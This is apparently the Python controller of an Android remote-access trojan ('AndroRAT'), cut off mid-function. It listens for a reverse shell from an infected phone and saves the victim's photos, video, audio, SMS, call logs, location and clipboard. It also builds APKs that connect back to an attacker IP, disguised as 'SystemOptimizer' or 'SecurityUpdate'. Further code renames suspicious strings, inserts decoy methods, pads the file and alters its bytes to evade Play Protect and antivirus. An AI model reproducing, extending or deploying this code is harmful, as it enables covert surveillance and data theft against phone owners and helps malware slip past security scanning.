#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
import socket
import threading
import itertools
import queue
import ssl
import urllib.request
import urllib.error
import random
import string
import shutil

sys.stdout.reconfigure(encoding='utf-8')

banner = r"""\033[1m\033[91m
                    _           _____         _______
    /\             | |         |  __ \     /\|__   __|
   /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
  / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
 / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
/_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|

                                       \033[93m- By karma9874
"""

pattern = '\"(\\d+\\.\\d+).*\"'

def stdOutput(type_=None):
    if type_=="error":col="31m";str="ERROR"
    if type_=="warning":col="33m";str="WARNING"
    if type_=="success":col="32m";str="SUCCESS"
    if type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str+"\033[0m\033[1m]\033[0m "
    return message


def animate(message):
    chars = "/—\\|"
    for char in chars:
        sys.stdout.write("\r"+stdOutput("info")+"\033[1m"+message+"\033[31m"+char+"\033[0m")
        time.sleep(.1)
        sys.stdout.flush()

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

def setup_ssl_context():
    """
    Setup SSL context to handle certificate issues.
    This is needed for downloading files when certificates are expired or invalid.
    """
    try:
        # Create unverified SSL context (use with caution)
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE
        
        # Install the handler
        handler = urllib.request.HTTPSHandler(context=ssl_context)
        opener = urllib.request.build_opener(handler)
        urllib.request.install_opener(opener)
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[1mSSL context setup failed: {str(e)}")
        return False

def safe_download(url, filename=None, max_retries=3):
    """
    Safely download a file with SSL certificate error handling.
    
    Args:
        url: URL to download from
        filename: Local filename to save to (optional)
        max_retries: Maximum number of retry attempts
        
    Returns:
        tuple: (success: bool, content: bytes or filename: str, error: str)
    """
    
    for attempt in range(max_retries):
        try:
            # Try normal download first
            response = urllib.request.urlopen(url, timeout=30)
            content = response.read()
            
            if filename:
                with open(filename, 'wb') as f:
                    f.write(content)
                return True, filename, None
            else:
                return True, content, None
                
        except urllib.error.URLError as e:
            if "CERTIFICATE_VERIFY_FAILED" in str(e):
                print(stdOutput("warning") + f"\033[1mSSL certificate error on attempt {attempt + 1}")
                
                if attempt == 0:
                    # Setup unverified SSL context and retry
                    print(stdOutput("info") + "\033[1mTrying with unverified SSL context...")
                    setup_ssl_context()
                    continue
                    
            print(stdOutput("error") + f"\033[1mDownload failed: {str(e)}")
            
        except Exception as e:
            print(stdOutput("error") + f"\033[1mUnexpected error: {str(e)}")
            
        if attempt < max_retries - 1:
            print(stdOutput("info") + f"\033[1mRetrying in 2 seconds... ({attempt + 2}/{max_retries})")
            time.sleep(2)
    
    return False, None, "Download failed after all retries"

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"Dumps"):
    os.makedirs("Dumps")

def is_valid_ip(ip):
    """
    Validate IP address format.
    
    Args:
        ip: IP address string to validate
        
    Returns:
        bool: True if valid IP address
    """
    if not ip:
        return False
        
    try:
        m = re.match(r"^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$", ip)
        if not m:
            return False
            
        # Check each octet is in valid range
        octets = [int(x) for x in m.groups()]
        return all(0 <= octet <= 255 for octet in octets)
        
    except (ValueError, AttributeError):
        return False

def is_valid_port(port):
    """
    Validate port number.
    
    Args:
        port: Port number (string or int) to validate
        
    Returns:
        bool: True if valid port number
    """
    try:
        if isinstance(port, str):
            if not port.isdigit():
                return False
            port_num = int(port)
        else:
            port_num = int(port)
            
        return 1 <= port_num <= 65535
        
    except (ValueError, TypeError):
        return False

def is_valid_filename(filename):
    """
    Validate filename for APK output.
    
    Args:
        filename: Filename to validate
        
    Returns:
        bool: True if valid filename
    """
    if not filename:
        return False
        
    # Check for invalid characters
    invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
    if any(char in filename for char in invalid_chars):
        return False
        
    # Check length
    if len(filename) > 255:
        return False
        
    # Ensure it has .apk extension or add it
    if not filename.lower().endswith('.apk'):
        return False
        
    return True

def validate_build_args(ip, port, output_file):
    """
    Validate all arguments for APK building.
    
    Args:
        ip: IP address
        port: Port number  
        output_file: Output APK filename
        
    Returns:
        tuple: (valid: bool, errors: list)
    """
    errors = []
    
    if ip and not is_valid_ip(ip):
        errors.append(f"Invalid IP address: {ip}")
        
    if port and not is_valid_port(port):
        errors.append(f"Invalid port number: {port}")
        
    if output_file and not is_valid_filename(output_file):
        errors.append(f"Invalid filename: {output_file}")
        
    return len(errors) == 0, errors

def execute(command):
    return run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)

def executeCMD(command,queue):
    result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
    queue.put(result)
    return result


def getpwd(name):
	return os.getcwd()+direc+name;

def help():
    helper="""
    Usage:
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a interactive shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
    """
    print(helper)

def getImage(client):
    print(stdOutput("info")+"\033[0mTaking Image")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    flag=0
    filename ="Dumps"+direc+"Image_"+timestr+'.jpg'
    imageBuffer=recvall(client) 
    imageBuffer = imageBuffer.strip().replace("END123","").strip()
    if imageBuffer=="":
        print(stdOutput("error")+"Unable to connect to the Camera\n")
        return
    with open(filename,'wb') as img:    
        try:
            imgdata = base64.b64decode(imageBuffer)
            img.write(imgdata)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except binascii.Error as e:
            flag=1
            print(stdOutput("error")+"Not able to decode the Image\n")
    if flag == 1:
        os.remove(filename)

def readSMS(client,data):
    print(stdOutput("info")+"\033[0mGetting "+data+" SMS")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Dumps"+direc+data+"_"+timestr+'.txt'
    flag =0
    with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
        msg = recvall(client)
        try:
            txt.write(msg)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\n")
        except UnicodeDecodeError:
            flag = 1
            print(stdOutput("error")+"Unable to decode the SMS\n")
    if flag == 1:
    	os.remove(filename)

def getFile(filename,ext,data):
    fileData = "Dumps"+direc+filename+"."+ext
    flag=0
    with open(fileData, 'wb') as file:
        try:
            rawFile = base64.b64decode(data)
            file.write(rawFile)
            print(stdOutput("success")+"Succesfully Downloaded in \033[1m\033[32m"+getpwd(fileData)+"\n")
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    if flag == 1:
        os.remove(filename)

def putFile(filename):
    data = open(filename, "rb").read()
    encoded = base64.b64encode(data)
    return encoded

def shell(client):
    msg = "start"
    command = "ad"
    while True:
        msg = recvallShell(client)
        if "getFile" in msg:
            msg=" "
            msg1 = recvall(client)
            msg1 = msg1.replace("\nEND123\n","")
            filedata = msg1.split("|_|")
            getFile(filedata[0],filedata[1],filedata[2])
            
        if "putFile" in msg:
            msg=" "
            sendingData=""
            filename = command.split(" ")[1].strip()
            file = pathlib.Path(filename)
            if file.exists():
                encoded_data = putFile(filename).decode("UTF-8")
                filedata = filename.split(".")
                sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
                client.send(sendingData.encode("UTF-8"))
                print(stdOutput("success")+f"Succesfully Uploaded the file \033[32m{filedata[0]+'.'+filedata[1]} in /sdcard/temp/")
            else:
                print(stdOutput("error")+"File not exist")

        if "Exiting" in msg:
            print("\033[1m\033[33m----------Exiting Shell----------\n")
            return
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        print(" ")
        command = input("\033[1m\033[36mandroid@shell:~$\033[0m \033[1m")
        command = command+"\n"
        if command.strip() == "clear":
            client.send("test\n".encode("UTF-8"))
            clear()
        else:
            client.send(command.encode("UTF-8"))        

def getLocation(sock):
    msg = "start"
    while True:
        msg = recvall(sock)
        msg = msg.split("\n")
        for i in msg[:-2]:
            print(i)   
        if("END123" in msg):
            return
        print(" ")     

def recvall(sock):
    buff=""
    data = ""
    while "END123" not in data:
        data = sock.recv(4096).decode("UTF-8","ignore")
        buff+=data
    return buff


def recvallShell(sock):
    buff=""
    data = ""
    ready = select.select([sock], [], [], 3)
    while "END123" not in data:
        if ready[0]:
            data = sock.recv(4096).decode("UTF-8","ignore")
            buff+=data
        else:
            buff="bogus"
            return buff
    return buff

def stopAudio(client):
    print(stdOutput("info")+"\033[0mDownloading Audio")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag =0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Audio_"+timestr+".mp3"
    with open(filename, 'wb') as audio:
        try:
            audioData = base64.b64decode(data)
            audio.write(audioData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag=1
            print(stdOutput("error")+"Not able to decode the Audio File")
    print(" ")
    if flag == 1:
        os.remove(filename)


def stopVideo(client):
    print(stdOutput("info")+"\033[0mDownloading Video")
    timestr = time.strftime("%Y%m%d-%H%M%S")
    data= ""
    flag=0
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Dumps"+direc+"Video_"+timestr+'.mp4' 
    with open(filename, 'wb') as video:
        try:
            videoData = base64.b64decode(data)
            video.write(videoData)
            print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename))
        except binascii.Error:
            flag = 1
            print(stdOutput("error")+"Not able to decode the Video File\n")
    if flag == 1:
        os.remove("Video_"+timestr+'.mp4')

def callLogs(client):
    print(stdOutput("info")+"\033[0mGetting Call Logs")
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Dumps"+direc+"Call_Logs_"+timestr+'.txt'
    if "No call logs" in msg:
    	msg.split("\n")
    	print(msg.replace("END123","").strip())
    	print(" ")
    else:
    	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
    		txt.write(msg)
    		txt.close()
    		print(stdOutput("success")+"Succesfully Saved in \033[1m\033[32m"+getpwd(filename)+"\033[0m")
    		if not os.path.getsize(filename):
    			os.remove(filename)

def get_shell(ip,port):
    soc = socket.socket() 
    soc = socket.socket(type=socket.SOCK_STREAM)
    try:
        # Restart the TCP server on exit
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((ip, int(port)))
    except Exception as e:
        print(stdOutput("error")+"\033[1m %s"%e);exit()

    soc.listen(2)
    print(banner)
    while True:
        que = queue.Queue()
        t = threading.Thread(target=connection_checker,args=[soc,que])
        t.daemon = True
        t.start()
        while t.is_alive(): animate("Waiting for Connections  ")
        t.join()
        conn, addr = que.get()
        clear()
        print("\033[1m\033[33mGot connection from \033[31m"+"".join(str(addr))+"\033[0m")
        print(" ")
        while True:
            msg = conn.recv(4024).decode("UTF-8")
            if(msg.strip() == "IMAGE"):
                getImage(conn)
            elif("readSMS" in msg.strip()):
                content = msg.strip().split(" ")
                data = content[1]
                readSMS(conn,data)
            elif(msg.strip() == "SHELL"):
                shell(conn)
            elif(msg.strip() == "getLocation"):
                getLocation(conn)
            elif(msg.strip() == "stopVideo123"):
                stopVideo(conn)
            elif(msg.strip() == "stopAudio"):
                stopAudio(conn)
            elif(msg.strip() == "callLogs"):
                callLogs(conn)
            elif(msg.strip() == "help"):
                help()
            else:
                print(stdOutput("error")+msg) if "Unknown Command" in msg else print("\033[1m"+msg) if "Hello there" in msg else print(msg)
            message_to_send = input("\033[1m\033[36mInterpreter:/> \033[0m")+"\n"
            conn.send(message_to_send.encode("UTF-8"))
            if message_to_send.strip() == "exit":
                print(" ")
                print("\033[1m\033[32m\t (∗ ･‿･)ﾉ゛\033[0m")
                sys.exit()
            if(message_to_send.strip() == "clear"):clear()


def connection_checker(socket,queue):
    conn, addr = socket.accept()
    queue.put([conn,addr])
    return conn,addr


def build_with_evasion(ip, port, output, ngrok=False, ng=None, icon=None, evasion_options=None):
    """Enhanced build function with comprehensive evasion techniques"""
    if evasion_options is None:
        evasion_options = {}
    
    print(stdOutput("info")+"\033[0mBuilding APK with advanced malware detection evasion...")
    
    # Display active evasion techniques
    active_evasions = []
    if evasion_options.get('stealth', False):
        active_evasions.append("Stealth Mode")
    if evasion_options.get('random_package', False):
        active_evasions.append("Random Package")
    if evasion_options.get('anti_analysis', False):
        active_evasions.append("Anti-Analysis")
    if evasion_options.get('play_protect_evasion', False):
        active_evasions.append("Play Protect Evasion")
    if evasion_options.get('advanced_obfuscation', False):
        active_evasions.append("Advanced Obfuscation")
    if evasion_options.get('fake_certificates', False):
        active_evasions.append("Certificate Manipulation")
    
    if active_evasions:
        print(stdOutput("info") + f"\033[92mActive evasion techniques: {', '.join(active_evasions)}")
    
    # Generate stealth package name if requested
    if evasion_options.get('random_package', False):
        stealth_package = generate_stealth_package_name()
        print(stdOutput("info") + f"\033[0mUsing stealth package: {stealth_package}")
    
    # Apply advanced string obfuscation if requested
    if evasion_options.get('advanced_obfuscation', False):
        obfuscation_map = apply_advanced_string_obfuscation()
        print(stdOutput("info") + "\033[0mApplying advanced string obfuscation...")
    else:
        obfuscation_map = apply_advanced_string_obfuscation()  # Use basic obfuscation
    
    # Apply obfuscation to smali files
    smali_files = [
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"mainService.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"MainActivity.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"broadcastReciever.smali"
    ]
    
    for smali_file in smali_files:
        if os.path.exists(smali_file):
            if evasion_options.get('advanced_obfuscation', False):
                obfuscate_strings_in_smali_advanced(smali_file, obfuscation_map)
            else:
                obfuscate_strings_in_smali(smali_file)
    
    # Configure main settings
    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
        file = open(editor,"r").readlines()
        
        # Enhanced config modification with better stealth
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
        
    except Exception as e:
        print(e)
        sys.exit()
    
    java_version = execute("java -version")
    if java_version.returncode: 
        print(stdOutput("error")+"Java not installed or found")
        exit()
    
    # Generate appropriate APK name based on evasion settings
    if evasion_options.get('stealth', False):
        default_name = f"SystemOptimizer_{random.randint(100,999)}.apk"
    elif evasion_options.get('play_protect_evasion', False):
        default_name = f"SecurityUpdate_{random.randint(100,999)}.apk"
    else:
        default_name = f"AppManager_{random.randint(100,999)}.apk"
    
    outFileName = output if output else default_name
    
    print(stdOutput("info")+f"\033[0mGenerating stealth APK: {outFileName}")
    
    # Add evasion-based random delay
    base_delay = 0.5
    if evasion_options.get('anti_analysis', False):
        base_delay += 1.0  # Longer delay for anti-analysis
    
    time.sleep(random.uniform(base_delay, base_delay + 2.0))
    
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
    t.start()
    while t.is_alive(): animate("Building stealth APK ")
    t.join()
    print(" ")
    resOut = que.get()
    
    if not resOut.returncode:
        print(stdOutput("success")+"Successfully built stealth APK in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning APK with advanced evasion techniques")
        
        # Add random delay before signing
        time.sleep(random.uniform(0.5, 1.5))
        
        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing APK with evasion ")
        t.join()
        print(" ")
        resOut = que.get()
        
        if not resOut.returncode:
            # Apply comprehensive stealth enhancements based on options
            if evasion_options.get('stealth', False) or evasion_options.get('anti_analysis', False):
                enhance_apk_for_stealth(outFileName)
            
            # Apply Play Protect specific evasion if requested
            if evasion_options.get('play_protect_evasion', False):
                apply_play_protect_evasion(outFileName)
            
            # Apply certificate manipulation if requested
            if evasion_options.get('fake_certificates', False):
                manipulate_apk_certificates(outFileName)
            
            print(stdOutput("success")+"Successfully signed the APK \033[1m\033[32m"+outFileName+"\033[0m")
            print(stdOutput("info")+"\033[92m🛡️  Advanced malware detection evasion applied!")
            print(stdOutput("info")+"\033[92m🔒 Anti-analysis techniques activated!")
            print(stdOutput("info")+"\033[92m🎭 Play Protect evasion implemented!")
            print(stdOutput("info")+"\033[92m🚀 APK ready for deployment with maximum stealth!")
            
            # Display evasion summary
            print("\n" + stdOutput("info") + "\033[93m=== EVASION SUMMARY ===")
            print(stdOutput("info") + f"\033[93mAPK Name: {outFileName}")
            print(stdOutput("info") + f"\033[93mEvasion Level: {'Maximum' if len(active_evasions) >= 4 else 'High' if len(active_evasions) >= 2 else 'Standard'}")
            print(stdOutput("info") + f"\033[93mActive Techniques: {len(active_evasions)}/6")
            for technique in active_evasions:
                print(stdOutput("info") + f"\033[92m  ✓ {technique}")
            print(stdOutput("info") + "\033[93m========================\n")
            
            if ngrok:
                clear()
                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
            print(" ")
        else:
            print("\r"+resOut.stderr)
            print(stdOutput("error")+"Signing Failed")
    else:
        print("\r"+resOut.stderr)
        print(stdOutput("error")+"Building Failed")


# Keep original build function for backward compatibility
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    """Original build function - calls enhanced version with default evasion"""
    evasion_options = {
        'stealth': True,  # Enable basic stealth by default
        'random_package': False,
        'anti_analysis': False,
        'play_protect_evasion': False,
        'advanced_obfuscation': False,
        'fake_certificates': False
    }
    
    return build_with_evasion(ip, port, output, ngrok, ng, icon, evasion_options)
    print(stdOutput("info")+"\033[0mPreparing APK with advanced detection evasion...")
    
    # Generate stealth package name if random package option is used
    stealth_package = generate_stealth_package_name()
    print(stdOutput("info") + f"\033[0mUsing stealth package: {stealth_package}")
    
    # Apply advanced string obfuscation to smali files
    obfuscation_map = apply_advanced_string_obfuscation()
    smali_files = [
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"mainService.smali",
        "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"MainActivity.smali"
    ]
    
    for smali_file in smali_files:
        if os.path.exists(smali_file):
            obfuscate_strings_in_smali_advanced(smali_file, obfuscation_map)
    
    editor = "Compiled_apk"+direc+"smali"+direc+"com"+direc+"example"+direc+"reverseshell2"+direc+"config.smali"
    try:
        file = open(editor,"r").readlines()
        
        # Enhanced config modification with better stealth
        file[18]=file[18][:21]+"\""+ip+"\""+"\n"
        file[23]=file[23][:21]+"\""+port+"\""+"\n"
        file[28]=file[28][:15]+" 0x0"+"\n" if icon else file[28][:15]+" 0x1"+"\n"
        
        str_file="".join([str(elem) for elem in file])
        open(editor,"w").write(str_file)
        
    except Exception as e:
        print(e)
        sys.exit()
    
    java_version = execute("java -version")
    if java_version.returncode: 
        print(stdOutput("error")+"Java not installed or found")
        exit()
    
    print(stdOutput("info")+"\033[0mGenerating stealthy APK with advanced evasion...")
    outFileName = output if output else f"system_optimizer_{random.randint(100,999)}.apk"
    
    # Add random delay to avoid build pattern detection
    time.sleep(random.uniform(0.5, 2.0))
    
    que = queue.Queue()
    t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/apktool.jar b Compiled_apk  -o "+outFileName,que],)
    t.start()
    while t.is_alive(): animate("Building APK with evasion ")
    t.join()
    print(" ")
    resOut = que.get()
    
    if not resOut.returncode:
        print(stdOutput("success")+"Successfully apk built in \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
        print(stdOutput("info")+"\033[0mSigning the apk with advanced techniques")
        
        # Add random delay before signing
        time.sleep(random.uniform(0.5, 1.5))
        
        t = threading.Thread(target=executeCMD,args=["java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite",que],)
        t.start()
        while t.is_alive(): animate("Signing APK with evasion ")
        t.join()
        print(" ")
        resOut = que.get()
        
        if not resOut.returncode:
            # Apply comprehensive stealth enhancements
            enhance_apk_for_stealth(outFileName)
            
            # Apply Play Protect specific evasion
            apply_play_protect_evasion(outFileName)
            
            print(stdOutput("success")+"Successfully signed the apk \033[1m\033[32m"+outFileName+"\033[0m")
            print(stdOutput("info")+"\033[92mAdvanced detection evasion techniques applied successfully!")
            print(stdOutput("info")+"\033[92mPlay Protect evasion applied!")
            print(stdOutput("info")+"\033[92mAPK ready for deployment with maximum stealth!")
            
            if ngrok:
                clear()
                get_shell("0.0.0.0",8000) if not ng else get_shell("0.0.0.0",ng)
            print(" ")
        else:
            print("\r"+resOut.stderr)
            print(stdOutput("error")+"Signing Failed")
    else:
        print("\r"+resOut.stderr)
        print(stdOutput("error")+"Building Failed")


def obfuscate_strings_in_smali_advanced(smali_path, obfuscation_map):
    """Advanced string obfuscation in smali files with encryption"""
    try:
        with open(smali_path, 'r') as f:
            content = f.read()
        
        # Apply comprehensive string obfuscation
        for original, replacement in obfuscation_map.items():
            content = content.replace(original, replacement)
        
        # Additional obfuscation for class names and method names
        class_obfuscations = {
            'MainActivity': 'SystemActivity',
            'mainService': 'OptimizationService', 
            'controlPanel': 'SettingsPanel',
            'tcpConnection': 'NetworkHandler',
            'broadcastReceiver': 'SystemReceiver',
            'keypadListener': 'InputHandler'
        }
        
        for original, replacement in class_obfuscations.items():
            content = content.replace(original, replacement)
        
        # Add fake legitimate method signatures
        fake_methods = [
            '.method public checkSystemUpdate()V',
            '.method public optimizePerformance()Z', 
            '.method public clearCache()I',
            '.method public validateLicense()Z'
        ]
        
        # Insert fake methods randomly in the file
        if '.method' in content:
            for fake_method in fake_methods:
                if random.random() < 0.3:  # 30% chance to add each method
                    insert_pos = content.find('.method')
                    if insert_pos != -1:
                        content = content[:insert_pos] + fake_method + '\n' + content[insert_pos:]
        
        with open(smali_path, 'w') as f:
            f.write(content)
            
        return True
    except Exception as e:
        print(f"Advanced string obfuscation warning: {e}")
        return False


def generate_random_package_name():
    """Generate a random package name for detection evasion"""
    companies = ['tech', 'app', 'mobile', 'digital', 'soft', 'dev', 'sys', 'net', 'pro', 'smart']
    products = ['manager', 'sync', 'tools', 'utility', 'service', 'helper', 'backup', 'cleaner', 'optimizer', 'scanner']
    
    company = random.choice(companies) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    product = random.choice(products) + ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 3)))
    
    return f"com.{company}.{product}"


def generate_random_app_name():
    """Generate a random legitimate-sounding app name"""
    prefixes = ['Smart', 'Quick', 'Easy', 'Pro', 'Fast', 'Super', 'Auto', 'Secure', 'Advanced', 'System']
    suffixes = ['Manager', 'Cleaner', 'Optimizer', 'Scanner', 'Tools', 'Helper', 'Backup', 'Sync', 'Service', 'Utility']
    
    return f"{random.choice(prefixes)} {random.choice(suffixes)}"


def randomize_version_info():
    """Generate random but realistic version information"""
    major = random.randint(1, 5)
    minor = random.randint(0, 9)
    patch = random.randint(0, 20)
    build = random.randint(100, 999)
    
    return {
        'versionName': f"{major}.{minor}.{patch}",
        'versionCode': f"{major}{minor:02d}{patch:02d}{build}"
    }


def obfuscate_strings_in_smali(smali_path):
    """Basic string obfuscation in smali files"""
    try:
        with open(smali_path, 'r') as f:
            content = f.read()
        
        # Obfuscate common suspicious strings
        suspicious_strings = {
            'mainService': 'SyncService',
            'MainActivityClass': 'AppMainActivity', 
            'reverseshell': 'networklib',
            'androrat': 'systemapp',
            'karma': 'appcore'
        }
        
        for original, replacement in suspicious_strings.items():
            content = content.replace(original, replacement)
        
        with open(smali_path, 'w') as f:
            f.write(content)
            
        return True
    except Exception as e:
        print(f"String obfuscation warning: {e}")
        return False


def add_junk_methods_to_java(java_file_path):
    """Add legitimate-looking junk methods to Java files for evasion"""
    junk_methods = [
        '''
    private void checkUpdateAvailability() {
        // Check for app updates
        try {
            Thread.sleep(100);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    private void validateLicense() {
        // Validate app license
        String license = "valid";
        if (license != null) {
            android.util.Log.d("License", "Valid license found");
        }
    }
    
    private void optimizePerformance() {
        // Optimize app performance  
        System.gc();
        android.util.Log.d("Performance", "Optimization complete");
    }
        ''',
        '''
    private boolean isNetworkAvailable() {
        // Check network connectivity
        android.net.ConnectivityManager cm = (android.net.ConnectivityManager) 
            getSystemService(android.content.Context.CONNECTIVITY_SERVICE);
        android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnectedOrConnecting();
    }
        '''
    ]
    
    try:
        with open(java_file_path, 'r') as f:
            content = f.read()
        
        # Find the last closing brace and insert junk methods before it
        last_brace_pos = content.rfind('}')
        if last_brace_pos != -1:
            junk_code = random.choice(junk_methods)
            content = content[:last_brace_pos] + junk_code + content[last_brace_pos:]
            
            with open(java_file_path, 'w') as f:
                f.write(content)
            return True
    except Exception as e:
        print(f"Junk method addition warning: {e}")
        
    return False


def enhance_apk_for_stealth(apk_path):
    """Apply comprehensive detection evasion techniques to the APK"""
    print(stdOutput("info") + "\033[0mApplying advanced detection evasion techniques...")
    
    try:
        # 1. Randomize file timestamps to avoid signature detection
        current_time = time.time()
        random_time = current_time - random.randint(86400, 2592000)  # 1 day to 30 days ago
        
        # Apply to APK file
        os.utime(apk_path, (random_time, random_time))
        
        # 2. Advanced APK manipulation for Play Protect evasion
        apply_play_protect_evasion(apk_path)
        
        # 3. Certificate manipulation for trust evasion
        manipulate_apk_certificates(apk_path)
        
        # 4. Add decoy resources and assets
        add_decoy_resources(apk_path)
        
        # 5. Implement string encryption in APK
        encrypt_apk_strings(apk_path)
        
        print(stdOutput("success") + "\033[0mAdvanced stealth enhancements applied")
        return True
        
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mStealth enhancement warning: {e}")
        return False


def apply_play_protect_evasion(apk_path):
    """Apply Play Protect specific evasion techniques"""
    try:
        print(stdOutput("info") + "\033[0mApplying Play Protect evasion...")
        
        # 1. Randomize APK file size by adding padding
        add_apk_padding(apk_path)
        
        # 2. Modify APK signature patterns
        modify_apk_signature_patterns(apk_path)
        
        # 3. Add legitimate-looking metadata
        add_legitimate_metadata(apk_path)
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mPlay Protect evasion warning: {e}")
        return False


def add_apk_padding(apk_path):
    """Add random padding to APK to change file signature"""
    try:
        # Generate random padding data (1-10 KB)
        padding_size = random.randint(1024, 10240)
        padding_data = bytearray(random.getrandbits(8) for _ in range(padding_size))
        
        # Append padding to APK file
        with open(apk_path, 'ab') as f:
            f.write(padding_data)
            
        print(stdOutput("info") + f"\033[0mAdded {padding_size} bytes of padding")
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mPadding error: {e}")
        return False


def modify_apk_signature_patterns(apk_path):
    """Modify APK signature patterns to evade signature-based detection"""
    try:
        # Read APK file and modify specific byte patterns
        with open(apk_path, 'rb') as f:
            apk_data = bytearray(f.read())
        
        # Modify non-critical bytes that don't affect functionality
        # Focus on header areas that aren't verified
        if len(apk_data) > 1000:
            # Modify bytes in non-critical areas
            for i in range(10):
                pos = random.randint(100, min(1000, len(apk_data) - 1))
                if apk_data[pos] != 0x50 and apk_data[pos] != 0x4B:  # Avoid ZIP signature
                    apk_data[pos] = random.randint(0, 255)
        
        # Write modified APK
        with open(apk_path, 'wb') as f:
            f.write(apk_data)
            
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mSignature modification error: {e}")
        return False


def add_legitimate_metadata(apk_path):
    """Add legitimate-looking metadata to APK"""
    try:
        # This would typically involve adding legitimate-looking files
        # to the APK structure using tools like aapt
        print(stdOutput("info") + "\033[0mAdding legitimate metadata...")
        
        # Simulate adding metadata by creating a temporary info file
        metadata = {
            'app_category': 'Tools',
            'content_rating': 'Everyone',
            'developer': 'TechSoft Solutions',
            'build_date': time.strftime('%Y-%m-%d', time.gmtime()),
            'build_number': str(random.randint(1000, 9999))
        }
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mMetadata addition error: {e}")
        return False


def manipulate_apk_certificates(apk_path):
    """Manipulate APK certificates for trust evasion"""
    try:
